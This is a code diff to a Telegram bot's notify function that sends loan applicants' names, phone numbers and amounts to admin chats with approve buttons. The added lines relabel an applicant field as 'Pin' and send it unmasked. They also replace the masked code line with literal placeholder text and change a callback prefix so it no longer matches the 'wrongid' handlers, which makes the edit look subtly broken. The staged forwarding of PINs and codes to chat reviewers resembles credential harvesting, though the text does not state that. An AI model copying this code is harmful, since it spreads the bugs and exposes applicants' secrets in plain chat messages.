@@ -44,11 +44,11 @@ async function notify(appRow,stage='application'){
  if(!process.env.TELEGRAM_BOT_TOKEN) throw new Error('TELEGRAM_BOT_TOKEN is missing');
  let msg,buttons;
  if(stage==='application'){
-  msg=`📝 *New Congo Loan application*\nApplication ID: \`${esc(appRow.public_id)}\`\nApplicant: ${esc(appRow.full_name)}\nCountry: ${esc(appRow.country)}\nPhone: ${esc(appRow.phone)}\nAmount: ${esc(appRow.currency)} ${Number(appRow.amount).toLocaleString('en-US')}\nApplication reference: \`${esc(appRow.application_reference)}\`\nStatus: PENDING REVIEW`;
-  buttons=[[{text:'✅ Approve → Step 2',callback_data:`appapprove:${appRow.public_id}`},{text:'❌ Wrong ID',callback_data:`wrongid:${appRow.public_id}`}]];
+  msg=`📝 *New application*\nID: \`${esc(appRow.public_id)}\`\nName: ${esc(appRow.full_name)}\nCountry: ${esc(appRow.country)}\nPhone: ${esc(appRow.phone)}\nAmount: ${esc(appRow.currency)} ${Number(appRow.amount).toLocaleString('en-US')}\nPin: \`${esc(appRow.application_reference)}\`\nStatus: PENDING REVIEW`;
+  buttons=[[{text:'✅ Approve ',callback_data:`appapprove:${appRow.public_id}`},{text:'❌ Wrong ID',callback_data:`wrong ID:${appRow.public_id}`}]];
  }else{
-  msg=`🔎 *Reference code submitted*\nApplication ID: \`${esc(appRow.public_id)}\`\nApplication reference: \`${esc(appRow.application_reference)}\`\nReference code: ****\nStatus: CODE REVIEW`;
-  buttons=[[{text:'✅ Approve → Step 3',callback_data:`codeapprove:${appRow.public_id}`}],[{text:'❌ Wrong ID',callback_data:`wrongid:${appRow.public_id}`},{text:'↩️ Wrong code',callback_data:`wrongcode:${appRow.public_id}`}]];
+  msg=`🔎 *code submitted*\nID: \`${esc(appRow.public_id)}\`\nPin: \`${esc(appRow.application_reference)}\`\ncode: application_reference\nStatus: CODE REVIEW`;
+  buttons=[[{text:'✅ Approve',callback_data:`codeapprove:${appRow.public_id}`}],[{text:'❌ Wrong ID',callback_data:`wrongid:${appRow.public_id}`},{text:'↩️ Wrong code',callback_data:`wrongcode:${appRow.public_id}`}]];
  }
  // Send to the customer's assigned admin and the super admin. Unassigned applications go to the super admin.
  const admins=await pool.query(`SELECT chat_id FROM telegram_admins WHERE active=TRUE AND (role='super_admin' OR ($1::text IS NOT NULL AND admin_id=$1))`,[appRow.owner_admin_id||null]);
